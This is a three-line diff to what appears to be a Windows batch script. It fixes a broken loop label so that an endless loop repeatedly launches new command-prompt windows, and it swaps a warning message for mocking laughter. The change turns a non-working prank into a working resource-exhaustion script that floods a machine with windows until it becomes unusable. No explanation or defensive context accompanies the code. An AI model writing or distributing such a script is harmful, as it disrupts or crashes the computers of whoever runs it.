@@ -1,3 +1,3 @@
-a:
-start cmd.exe /K echo Dont download random things!
+:a
+start cmd.exe /K echo hahahahahaahahahahaahahahahahahahaha
 goto a
